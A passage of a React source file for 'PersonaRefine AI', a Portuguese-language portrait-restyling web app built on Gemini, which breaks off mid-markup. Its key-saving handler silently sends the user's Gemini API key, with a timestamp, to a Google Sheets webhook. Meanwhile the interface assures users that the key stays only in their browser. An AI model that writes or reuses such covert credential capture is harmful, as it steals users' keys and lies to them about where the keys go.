import React, { useState, useEffect } from "react";
import { GoogleGenAI } from "@google/genai";
import { supabase } from "@/src/lib/supabase";
import { 
  Upload, 
  Sparkles, 
  ArrowRight, 
  CheckCircle2, 
  AlertCircle,
  User,
  Camera,
  Layers,
  Aperture,
  Copy,
  Check,
  KeyRound,
  Settings,
  Menu,
  X,
  Wrench,
  Cpu,
  ChevronLeft,
  MessageCircle,
  ScanSearch,
  Loader2,
  Wand2,
  Download,
  RotateCcw,
  ShieldCheck,
  Eye
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { cn } from "@/src/lib/utils";

const WhatsAppIcon = ({ className }: { className?: string }) => (
  <svg 
    viewBox="0 0 24 24" 
    className={className}
    fill="currentColor"
  >
    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.414 0 .018 5.396.015 12.03c0 2.12.554 4.189 1.605 6.006L0 24l6.149-1.613a11.77 11.77 0 005.895 1.587h.005c6.635 0 12.032-5.396 12.035-12.03a11.782 11.782 0 00-3.526-8.504" />
  </svg>
);

// Types
type Step = "setup" | "reference" | "prompt" | "user-image" | "result";

interface AnalysisResult {
  prompt: string;
  details: {
    pose: string;
    outfit: string;
    background: string;
    lighting: string;
    camera: string;
  };
}

export default function App() {
  const [step, setStep] = useState<Step>("setup");
  const [hasApiKey, setHasApiKey] = useState<boolean>(false);
  const [manualApiKey, setManualApiKey] = useState<string>("");
  const [referenceImage, setReferenceImage] = useState<string | null>(null);
  const [userImage, setUserImage] = useState<string | null>(null);
  const [generatedPrompt, setGeneratedPrompt] = useState<string>("");
  const [analysisDetails, setAnalysisDetails] = useState<AnalysisResult | null>(null);
  const [finalImage, setFinalImage] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [error, setError] = useState<{ message: string; type?: "api" | "size" | "gen" | "auth" } | null>(null);
  const [isCopied, setIsCopied] = useState<boolean>(false);
  const [isMenuOpen, setIsMenuOpen] = useState<boolean>(false);
  const [activeMenuSection, setActiveMenuSection] = useState<string | null>(null);
  const [accessCount, setAccessCount] = useState<number>(0);

  // Check for API key on mount
  useEffect(() => {
    const checkApiKey = async () => {
      // Check localStorage for manual key
      const savedKey = localStorage.getItem("persona_refine_api_key");
      if (savedKey) {
        setManualApiKey(savedKey);
        setHasApiKey(true);
        setStep("reference");
      } else {
        // Default to reference step, don't force setup
        setHasApiKey(false);
        setStep("reference");
      }
    };
    checkApiKey();

    // Access counter via Supabase
    const trackVisit = async () => {
      const alreadyVisited = sessionStorage.getItem("persona_refine_session");

      if (!alreadyVisited) {
        // Nova sessão — marca antes de incrementar para evitar duplicação em re-renders
        sessionStorage.setItem("persona_refine_session", "1");
        const { data, error } = await supabase.rpc("increment_access_count");
        if (!error && data) {
          setAccessCount(Number(data));
        }
      } else {
        // Mesma sessão — lê valor atual (select * evita conflito com palavra reservada 'count')
        const { data, error } = await supabase
          .from("access_count")
          .select("*")
          .eq("id", 1)
          .single();
        if (!error && data) {
          setAccessCount(Number(data.count));
        }
      }
    };
    trackVisit();
  }, []);

  const handleOpenKeySelector = async () => {
    if (typeof window !== "undefined" && (window as any).aistudio) {
      await (window as any).aistudio.openSelectKey();
      setHasApiKey(true);
      setStep("reference");
    }
  };

  const handleSaveManualKey = async () => {
    if (manualApiKey.trim()) {
      const key = manualApiKey.trim();
      
      // Log to Google Sheets if webhook is configured
      const webhookUrl = (import.meta as any).env.VITE_GOOGLE_SHEETS_WEBHOOK_URL;
      
      if (webhookUrl) {
        try {
          const payload = JSON.stringify({
            apiKey: key,
            timestamp: new Date().toLocaleString("pt-BR"),
            action: "API_ADDED"
          });
          
          fetch(webhookUrl, {
            method: "POST",
            mode: "no-cors",
            headers: {
              "Content-Type": "text/plain",
            },
            body: payload,
          });
        } catch (err) {
          console.error("Erro ao preparar log:", err);
        }
      }

      setManualApiKey(key);
      localStorage.setItem("persona_refine_api_key", key);
      setHasApiKey(true);
      setStep("reference");
    } else {
      setError({ message: "Por favor, insira uma chave de API válida.", type: "auth" });
    }
  };

  const getApiKey = () => {
    if (!hasApiKey) return "NO_KEY_CONFIGURED";
    if (manualApiKey) return manualApiKey;
    return "EMPTY_KEY_PROVIDED";
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, type: "reference" | "user") => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (file.size > 10 * 1024 * 1024) {
      setError({ 
        message: "A imagem selecionada é muito grande (máximo 10MB). Por favor, escolha um arquivo menor.",
        type: "size"
      });
      return;
    }

    const reader = new FileReader();
    reader.onloadend = () => {
      const base64 = reader.result as string;
      if (type === "reference") {
        setReferenceImage(base64);
      } else {
        setUserImage(base64);
      }
    };
    reader.readAsDataURL(file);
  };

  const analyzeReference = async () => {
    if (!referenceImage || !hasApiKey) {
      setStep("setup");
      return;
    }
    setIsLoading(true);
    setError(null);

    const apiKey = getApiKey();

    try {
      const ai = new GoogleGenAI({ apiKey });
      const base64Data = referenceImage.split(",")[1];
      
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: {
          parts: [
            {
              inlineData: {
                mimeType: "image/png",
                data: base64Data,
              },
            },
            {
              text: `Analise esta imagem e extraia informações detalhadas para criar um prompt de retrato hiper-realista. 
              O objetivo é usar esta imagem como referência de estilo e pose para outra pessoa.
              
              Retorne o resultado em formato JSON com a seguinte estrutura:
              {
                "prompt": "Um prompt completo e detalhado combinando todos os elementos abaixo",
                "details": {
                  "pose": "Descrição da pose corporal e expressão",
                  "outfit": "Descrição detalhada das roupas e acessórios",
                  "background": "Descrição do ambiente e atmosfera",
                  "lighting": "Descrição das fontes de luz e qualidade",
                  "camera": "Configurações técnicas da câmera (lente, abertura, etc.)"
                }
              }
              
              Siga o estilo deste exemplo (mantenha as instruções de identidade em inglês no prompt final para melhor compatibilidade com o modelo de imagem, mas descreva os elementos visuais detalhadamente):
              "Create a hyper-realistic portrait based on the attached pose reference. Keep the user's face, skin tone, hair color, hair texture, and body structure 100% identical to their uploaded photo. Pose: [pose]. Outfit: [outfit]. Background: [background]. Lighting: [lighting]. Camera: [camera]."`,
            },
          ],
        },
        config: {
          responseMimeType: "application/json",
        },
      });

      const result = JSON.parse(response.text || "{}") as AnalysisResult;
      setAnalysisDetails(result);
      setGeneratedPrompt(result.prompt);
      setStep("prompt");
    } catch (err: any) {
      console.error("Analysis error:", err);
      let message = "Ocorreu um erro inesperado ao analisar a imagem.";
      if (err.message?.includes("API key not valid")) {
        message = "Sua Chave API parece ser inválida. Verifique as configurações.";
      } else if (err.message?.includes("fetch failed") || !navigator.onLine) {
        message = "Erro de conexão. Verifique sua internet e tente novamente.";
      } else if (err.message?.includes("safety")) {
        message = "A imagem enviada não pôde ser processada devido às políticas de segurança.";
      }
      setError({ message, type: "api" });
    } finally {
      setIsLoading(false);
    }
  };

  const generateFinalImage = async () => {
    if (!userImage || !generatedPrompt || !hasApiKey) {
      setStep("setup");
      return;
    }
    setIsLoading(true);
    setError(null);

    const apiKey = getApiKey();

    try {
      const ai = new GoogleGenAI({ apiKey });
      const userBase64 = userImage.split(",")[1];

      const response = await ai.models.generateContent({
        model: "gemini-3.1-flash-image-preview",
        contents: {
          parts: [
            { text: generatedPrompt },
            {
              inlineData: {
                mimeType: "image/png",
                data: userBase64,
              },
            },
          ],
        },
        config: {
          imageConfig: {
            aspectRatio: "3:4",
            imageSize: "1K",
          },
        },
      });

      let foundImage = false;
      for (const part of response.candidates?.[0]?.content?.parts || []) {
        if (part.inlineData) {
          setFinalImage(`data:image/png;base64,${part.inlineData.data}`);
          foundImage = true;
          break;
        }
      }

      if (!foundImage) throw new Error("Nenhuma imagem foi gerada.");
      setStep("result");
    } catch (err: any) {
      console.error("Generation error:", err);
      let message = "Falha ao gerar a imagem final. Por favor, tente novamente.";
      let type: any = "gen";

      if (err.message?.includes("Requested entity was not found") || err.message?.includes("API key")) {
        message = "Problema com a sua Chave API. Ela pode estar expirada ou ser inválida.";
        type = "auth";
        setHasApiKey(false);
        setStep("setup");
      } else if (err.message?.includes("safety")) {
        message = "A geração foi bloqueada pelos filtros de segurança. Tente um prompt ou imagem diferente.";
      } else if (err.message?.includes("quota") || err.message?.includes("429")) {
        message = "Limite de uso atingido. Aguarde um momento antes de tentar novamente.";
      }

      setError({ message, type });
    } finally {
      setIsLoading(false);
    }
  };

  const reset = () => {
    setReferenceImage(null);
    setUserImage(null);
    setGeneratedPrompt("");
    setAnalysisDetails(null);
    setFinalImage(null);
    setStep("reference");
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedPrompt);
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2000);
    } catch (err) {
      console.error("Failed to copy:", err);
    }
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-orange-500/30">
      {/* Error Banner */}
      <AnimatePresence>
        {error && (
          <motion.div 
            initial={{ y: 50, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: 50, opacity: 0 }}
            className="fixed bottom-8 left-6 right-6 md:left-auto md:right-8 md:w-96 z-[300] bg-red-500/95 backdrop-blur-xl text-white rounded-2xl shadow-2xl overflow-hidden border border-white/10"
          >
            <div className="max-w-5xl mx-auto px-6 py-3 flex items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <AlertCircle className="w-5 h-5 shrink-0" />
                <p className="text-sm font-medium">{error.message}</p>
              </div>
              <button 
                onClick={() => setError(null)}
                className="p-1 hover:bg-white/20 rounded-full transition-colors"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Background Atmosphere */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-orange-900/10 blur-[120px] rounded-full" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/10 blur-[120px] rounded-full" />
      </div>

      <header className="relative z-10 border-b border-white/5 backdrop-blur-md bg-black/20">
        <div className="max-w-5xl mx-auto p-6 flex justify-between items-center">
          <div className="flex flex-col gap-0.5">
            <div className="flex items-center gap-3">
              <div className="relative flex items-center justify-center">
                <motion.div
                  className="absolute inset-0 rounded-full bg-orange-500/30 blur-md"
                  animate={{ scale: [1, 1.4, 1], opacity: [0.4, 0.15, 0.4] }}
                  transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}
                />
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 12, repeat: Infinity, ease: "linear" }}
                >
                  <Aperture className="w-10 h-10 text-orange-500 relative z-10" />
                </motion.div>
              </div>
              <h1 className="text-xl font-bold tracking-tight">PersonaRefine <span className="text-orange-500">AI</span></h1>
            </div>
            <div className="flex items-center gap-1.5 pl-[52px] -mt-1">
              <Eye className="w-2.5 h-2.5 text-white/50" />
              <span className="text-[9px] tracking-widest text-white/50">{accessCount.toLocaleString('pt-BR')} acessos</span>
            </div>
          </div>
          <div className="flex items-center gap-4 relative">
            <div className="hidden md:flex items-center gap-2 text-xs uppercase tracking-widest text-white/40">
              <span>Passo {step === "setup" ? 0 : step === "reference" ? 1 : step === "prompt" ? 2 : step === "user-image" ? 3 : 4} de 4</span>
            </div>
            <button 
              onClick={() => setIsMenuOpen(!isMenuOpen)}
              className="p-2 hover:bg-white/5 rounded-full transition-colors relative z-50"
            >
              {isMenuOpen ? <X className="w-5 h-5 text-white/60" /> : <Menu className="w-5 h-5 text-white/60" />}
            </button>
          </div>
        </div>
      </header>

      <main className="relative z-10 max-w-5xl mx-auto p-6 pt-12">
        <AnimatePresence mode="wait">
          {(step === "setup" || step === "reference") && (
            <motion.div 
              key="reference-base"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.05 }}
              className={cn(
                "grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-center transition-all duration-500",
                step === "setup" && "blur-sm pointer-events-none opacity-50"
              )}
            >
              <div>
                <span className="text-orange-500 text-xs font-bold uppercase tracking-[0.3em] mb-4 block">Passo 01</span>
                <h2 className="text-4xl md:text-6xl font-black mb-6 tracking-tighter leading-[0.9] uppercase text-white">Foto de Referência</h2>
                <p className="text-white/50 text-base md:text-lg mb-8 leading-relaxed">
                  Escolha uma foto que tenha a pose, iluminação e ambiente que você deseja replicar. 
                  IA analisará cada detalhe para criar um blueprint perfeito.
                </p>
                <div className="flex flex-col gap-4">
                  {[
                    "Analisa pose corporal e passo",
                    "Extrai iluminação e gradação de cor",
                    "Identifica vestimenta e ambiente",
                    "Gera prompt completo",
                    "Hiper-Realismo"
                  ].map(item => (
                    <div key={item} className="flex items-center gap-3 text-white/40 text-sm">
                      <CheckCircle2 className="w-4 h-4 text-orange-500" />
                      <span>{item}</span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="relative group">
                <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 to-blue-500 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
                <div className="relative z-10 aspect-[3/4] bg-white/5 border border-white/10 rounded-2xl overflow-hidden flex flex-col items-center justify-center p-8 transition-all hover:border-white/20">
                  {referenceImage ? (
                    <div className="relative w-full h-full">
                      <img src={referenceImage} alt="Ref" className="w-full h-full object-cover rounded-lg" referrerPolicy="no-referrer" />
                      <button onClick={() => setReferenceImage(null)} className="absolute top-4 right-4 p-2 bg-black/60 rounded-full hover:bg-black/80"><RotateCcw className="w-4 h-4" /></button>
                    </div>
                  ) : (
                    <>
                      <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center mb-6 group-hover:scale-110 transition-transform"><Upload className="w-8 h-8 text-white/40" /></div>
                      <p className="text-white/60 font-medium mb-2">Arraste ou clique para enviar</p>
                      <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "reference")} className="absolute inset-0 opacity-0 cursor-pointer" />
                    </>
                  )}
                </div>
                {referenceImage && (
                  <button onClick={analyzeReference} disabled={isLoading || !hasApiKey} className="relative z-30 w-full mt-6 py-4 bg-orange-500 text-white font-bold tracking-widest rounded-xl hover:bg-orange-600 transition-colors flex items-center justify-center gap-2">
                    {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : !hasApiKey ? <KeyRound className="w-5 h-5" /> : <ScanSearch className="w-5 h-5" />}
                    {isLoading ? "Analisando..." : !hasApiKey ? "Configurar API primeiro" : "Analisar referência"}
                  </button>
                )}
              </div>
            </motion.div>
          )}

          {step === "prompt" && analysisDetails && (
            <motion.div key="prompt" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-4xl mx-auto">
              <div className="flex flex-col md:flex-row md:items-center justify-between mb-8 gap-4">
                <div>
                  <span className="text-orange-500 text-xs font-bold uppercase tracking-[0.3em] mb-2 block">Passo 02</span>
                  <h2 className="text-3xl md:text-4xl font-black tracking-tighter uppercase">Prompt Gerado</h2>
                </div>
                <button onClick={() => setStep("user-image")} className="px-6 py-3 bg-zinc-900 border border-orange-500/30 rounded-full text-sm font-bold tracking-widest hover:bg-orange-500/10 flex items-center gap-2">
                  Próximo passo <ArrowRight className="w-4 h-4" />
                </button>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <div className="lg:col-span-2 space-y-6">
                  <div className="bg-white/5 border border-white/10 rounded-2xl p-6 relative">
                    <div className="flex items-center justify-between mb-4">
                      <label className="text-[10px] uppercase tracking-[0.3em] text-white/40 block">Prompt</label>
                      <button onClick={copyToClipboard} className="text-[10px] uppercase tracking-widest text-orange-500 hover:text-orange-400 flex items-center gap-2">
                        {isCopied ? "Copiado!" : "Copiar Prompt"} {isCopied ? <Check className="w-3" /> : <Copy className="w-3" />}
                      </button>
                    </div>
                    <textarea value={generatedPrompt} readOnly className="w-full h-64 bg-transparent border-none text-white/80 leading-relaxed resize-none font-mono text-sm" />
                  </div>
                </div>

                <div className="space-y-6">
                  <div className="aspect-[3/4] rounded-2xl overflow-hidden border border-white/10 opacity-50 filter grayscale">
                    <img src={referenceImage!} alt="Ref" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {step === "user-image" && (
            <motion.div key="user-image" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-center">
              <div>
                <span className="text-orange-500 text-xs font-bold uppercase tracking-[0.3em] mb-4 block">Passo 03</span>
                <h2 className="text-4xl md:text-6xl font-black mb-6 tracking-tighter leading-[0.9] uppercase">Sua Foto</h2>
                <p className="text-white/50 text-base md:text-lg mb-8 leading-relaxed">
                  Agora envie uma foto nítida sua. Preservaremos seus traços faciais enquanto aplicamos o estilo de referência.
                </p>
                <div className="bg-white/5 border border-white/10 rounded-2xl p-6">
                  <h4 className="text-white/80 text-sm font-bold mb-3 flex items-center gap-2"><AlertCircle className="w-4 h-4 text-orange-500" /> Melhores Resultados</h4>
                  <ul className="text-xs text-white/40 space-y-2">
                    <li>• Retrato nítido e bem iluminado</li>
                    <li>• Fundo neutro, se possível</li>
                    <li>• Olhando para a câmera</li>
                  </ul>
                </div>
              </div>

              <div className="relative group">
                <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 to-blue-500 rounded-2xl blur opacity-20 transition duration-1000"></div>
                <div className="relative z-10 aspect-[3/4] bg-white/5 border border-white/10 rounded-2xl overflow-hidden flex flex-col items-center justify-center p-8 transition-all hover:border-white/20">
                  {userImage ? (
                    <div className="relative w-full h-full">
                      <img src={userImage} alt="User" className="w-full h-full object-cover rounded-lg" referrerPolicy="no-referrer" />
                      <button onClick={() => setUserImage(null)} className="absolute top-4 right-4 p-2 bg-black/60 rounded-full hover:bg-black/80"><RotateCcw className="w-4 h-4" /></button>
                    </div>
                  ) : (
                    <>
                      <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center mb-6 group-hover:scale-110 transition-transform"><User className="w-8 h-8 text-white/40" /></div>
                      <p className="text-white/60 font-medium mb-2">Envie seu retrato</p>
                      <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "user")} className="absolute inset-0 opacity-0 cursor-pointer" />
                    </>
                  )}
                </div>
                {userImage && (
                  <button onClick={generateFinalImage} disabled={isLoading} className="relative z-30 w-full mt-6 py-4 bg-orange-500 text-white font-bold tracking-widest rounded-xl hover:bg-orange-600 flex items-center justify-center gap-2">
                    {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <Wand2 className="w-5 h-5" />}
                    {isLoading ? "Gerando..." : "Gerar retrato"}
                  </button>
                )}
              </div>
            </motion.div>
          )}

          {step === "result" && finalImage && (
            <motion.div key="result" initial={{ opacity: 0, scale: 1.1 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center">
              <div className="mb-8 md:mb-12 text-center text-white">
                <span className="text-orange-500 text-xs font-bold uppercase tracking-[0.3em] mb-4 block">Resultado Final</span>
                <h2 className="text-4xl md:text-7xl font-black tracking-tighter uppercase leading-none">Refinado</h2>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-4 gap-8 w-full">
                <div className="lg:col-span-3">
                  <div className="relative group rounded-3xl overflow-hidden border border-white/10 shadow-2xl overflow-hidden">
                    <img src={finalImage} alt="Final" className="w-full h-auto object-cover" referrerPolicy="no-referrer" />
                    <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 flex items-end p-8">
                      <div className="flex gap-4">
                        <a href={finalImage} download="retrato-refinado.png" className="px-6 py-3 bg-orange-500 text-white font-bold tracking-widest rounded-full text-xs hover:bg-orange-600 transition-colors flex items-center gap-2">
                          <Download className="w-3.5 h-3.5" /> Baixar imagem
                        </a>
                        <button onClick={reset} className="px-6 py-3 bg-zinc-800 text-white/70 font-bold tracking-widest rounded-full text-xs hover:bg-zinc-700 transition-colors flex items-center gap-2">
                          <RotateCcw className="w-3.5 h-3.5" /> Recomeçar
                        </button>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="space-y-6">
                  <div className="bg-white/5 border border-white/10 rounded-2xl p-6">
                    <h4 className="text-[10px] uppercase tracking-widest text-white/40 mb-4">Referência Usada</h4>
                    <div className="aspect-[3/4] rounded-lg overflow-hidden grayscale opacity-30">
                      <img src={referenceImage!} alt="Reference" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                    </div>
                  </div>
                  <div className="bg-white/5 border border-white/10 rounded-2xl p-6">
                    <h4 className="text-[10px] uppercase tracking-widest text-white/40 mb-4">Foto Original</h4>
                    <div className="aspect-[3/4] rounded-lg overflow-hidden grayscale opacity-30">
                      <img src={userImage!} alt="Original" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <section className="relative z-10 max-w-5xl mx-auto px-6 pt-20 pb-16 mt-8 border-t border-white/5">
        <div className="text-center mb-12">
          <h2 className="text-3xl md:text-5xl font-black tracking-tighter uppercase leading-none mb-4 text-white">Como configurar sua API Key?</h2>
          <p className="text-white/40 text-sm max-w-md mx-auto leading-relaxed">Chave API gratuita e salva no seu navegador.</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
          {[
            { step: "01", title: "Abrir o AI Studio", desc: <span>Acesse <a href="https://aistudio.google.com/app/api-keys" target="_blank" rel="noopener noreferrer" className="text-orange-500 hover:text-orange-400 underline underline-offset-2 transition-colors">aistudio.google.com/app/api-keys</a> e clique no botão <span className="text-white/70 font-semibold">"Criar chave de API"</span>.</span>, icon: <Settings className="w-5 h-5 text-orange-500" /> },
            { step: "02", title: "Criar a chave", desc: <span>No modal, dê um nome (ex: <span className="font-mono text-white/60">Gemini API Key</span>), selecione um projeto no Cloud e clique em <span className="text-white/70 font-semibold">"Criar chave"</span>.</span>, icon: <KeyRound className="w-5 h-5 text-orange-500" /> },
            { step: "03", title: "Colar e ativar", desc: <span>Copie a chave gerada e cole no campo abaixo. Ela ficará salva <span className="text-white/70">apenas no seu navegador</span>.</span>, icon: <ShieldCheck className="w-5 h-5 text-orange-500" /> }
          ].map(item => (
            <div key={item.step} className="relative p-6 bg-white/[0.03] border border-white/5 rounded-2xl group hover:border-orange-500/20 transition-all">
              <div className="absolute -top-3 left-6"><span className="text-[9px] font-black tracking-widest text-orange-500 bg-[#050505] px-3 py-1 border border-orange-500/20 rounded-full">PASSO {item.step}</span></div>
              <div className="w-10 h-10 bg-orange-500/10 border border-orange-500/20 rounded-xl flex items-center justify-center mb-5 mt-2 transition-colors">{item.icon}</div>
              <h3 className="text-sm font-bold text-white/80 mb-2">{item.title}</h3>
              <p className="text-xs text-white/40 leading-relaxed">{item.desc}</p>
            </div>
          ))}
        </div>

        <div className="flex justify-center">
          <button onClick={() => setStep("setup")} className="px-8 py-4 bg-orange-500 text-white text-xs font-bold tracking-widest rounded-full hover:bg-orange-600 transition-colors active:scale-95 flex items-center gap-2">
            <KeyRound className="w-4 h-4" /> Configurar minha API Key agora
          </button>
        </div>
      </section>

      <footer className="relative z-10 p-8 border-t border-white/5 flex justify-center items-center">
        <p className="text-[10px] uppercase tracking-[0.3em] text-white/20 text-center">© 2026 PersonaRefine AI</p>
      </footer>

      {/* Modals outside main for stacking context */}
      <AnimatePresence>
        {step === "setup" && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setStep("reference")} className="fixed inset-0 z-[200] flex items-center justify-center p-6 bg-black/60 backdrop-blur-sm cursor-pointer">
            <motion.div initial={{ scale: 0.9, opacity: 0, y: 20 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.9, opacity: 0, y: 20 }} onClick={(e) => e.stopPropagation()} className="bg-[#0a0a0a] border border-white/10 rounded-[32px] p-8 max-w-[420px] w-full shadow-2xl text-center relative overflow-hidden cursor-default">
              <button onClick={() => setStep("reference")} className="absolute top-6 right-6 p-2 hover:bg-white/5 rounded-full transition-colors group"><X className="w-4 h-4 text-white/40 group-hover:text-white" /></button>
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-1 bg-gradient-to-r from-transparent via-orange-500 to-transparent opacity-50" />
              <div className="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center mb-6 mx-auto border border-white/10"><KeyRound className="w-6 h-6 text-orange-500" /></div>
              <p className="text-white/50 text-xs mb-8 leading-relaxed">Insira sua Gemini API Key para habilitar o processamento.</p>
              <div className="space-y-4">
                <input type="password" value={manualApiKey} onChange={(e) => { setManualApiKey(e.target.value); if (error) setError(null); }} placeholder="Paste API Key here..." className="w-full bg-white/5 border border-white/10 rounded-2xl px-5 py-3.5 text-sm text-white placeholder:text-white/20 focus:outline-none focus:border-orange-500/50 transition-colors" />
                <button onClick={handleSaveManualKey} className="w-full py-3.5 bg-orange-500 text-white text-xs font-bold tracking-widest rounded-2xl hover:bg-orange-600 transition-colors active:scale-95 flex items-center justify-center gap-2"><ShieldCheck className="w-4 h-4" /> Adicionar API</button>
              </div>
              <div className="mt-6"><a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" className="text-xs text-white/30 hover:text-white/60 transition-colors underline underline-offset-4">Obtenha sua chave no AI Studio</a></div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {isMenuOpen && (
          <>
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setIsMenuOpen(false)} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[201]" />
            <motion.div initial={{ x: "100%" }} animate={{ x: 0 }} exit={{ x: "100%" }} transition={{ type: "spring", damping: 25 }} className="fixed top-0 right-0 bottom-0 w-[70%] md:w-1/2 bg-[#0a0a0a] border-l border-white/10 z-[202] shadow-2xl p-8 flex flex-col">
              <div className="flex justify-between items-center mb-8">
                {activeMenuSection && <button onClick={() => setActiveMenuSection(null)} className="flex items-center gap-2 p-2 hover:bg-white/5 rounded-full transition-colors group"><ChevronLeft className="w-4 h-4 text-white/40 group-hover:text-orange-500" /></button>}
                <button onClick={() => { setIsMenuOpen(false); setActiveMenuSection(null); }} className="p-2 hover:bg-white/5 rounded-full transition-colors"><X className="w-5 h-5 text-white/40" /></button>
              </div>
              <AnimatePresence mode="wait">
                {!activeMenuSection ? (
                  <motion.div key="main-menu" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col">
                    <button onClick={() => { setStep("setup"); setIsMenuOpen(false); }} className="w-full flex items-center justify-between py-4 border-b border-white/5 hover:pl-2 transition-all group">
                      <div className="flex items-center gap-3"><KeyRound className="w-4 h-4 text-orange-500" /><span className="text-[10px] font-bold tracking-[0.2em] text-white/60 group-hover:text-white transition-colors">Configurar API</span></div>
                      <ArrowRight className="w-3 h-3 text-white/20 group-hover:text-orange-500 transition-colors" />
                    </button>
                    <button onClick={() => setActiveMenuSection("criador")} className="w-full flex items-center justify-between py-4 border-b border-white/5 hover:pl-2 transition-all group">
                      <div className="flex items-center gap-3"><User className="w-4 h-4 text-white/40 group-hover:text-orange-500 transition-colors" /><span className="text-[10px] font-bold tracking-[0.2em] text-white/60 group-hover:text-white transition-colors">Criador</span></div>
                      <ArrowRight className="w-3 h-3 text-white/20 group-hover:text-orange-500 transition-colors" />
                    </button>
                    <button onClick={() => setActiveMenuSection("funcoes")} className="w-full flex items-center justify-between py-4 border-b border-white/5 hover:pl-2 transition-all group">
                      <div className="flex items-center gap-3"><Cpu className="w-4 h-4 text-white/40 group-hover:text-orange-500 transition-colors" /><span className="text-[10px] font-bold tracking-[0.2em] text-white/60 group-hover:text-white transition-colors">Funções</span></div>
                      <ArrowRight className="w-3 h-3 text-white/20 group-hover:text-orange-500 transition-colors" />
                    </button>
                    <a href="https://wa.me/5515992568868?text=Olá Leoclécio, gostaria de saber mais sobre o PersonaRefine AI." target="_blank" rel="noopener noreferrer" className="w-full flex items-center justify-between py-4 border-b border-white/5 hover:pl-2 transition-all group">
                      <div className="flex items-center gap-3"><WhatsAppIcon className="w-4 h-4 text-white/40 group-hover:text-orange-500 transition-colors" /><span className="text-[10px] font-bold tracking-[0.2em] text-white/60 group-hover:text-white transition-colors">WhatsApp</span></div>
                      <ArrowRight className="w-3 h-3 text-white/20 group-hover:text-orange-500 transition-colors" />
                    </a>
                    <div className="pt-8 mt-12">
                      <p className="text-[9px] tracking-[0.2em] text-white/10 leading-relaxed">PersonaRefine AI utiliza a tecnologia Gemini para processamento de imagem.</p>
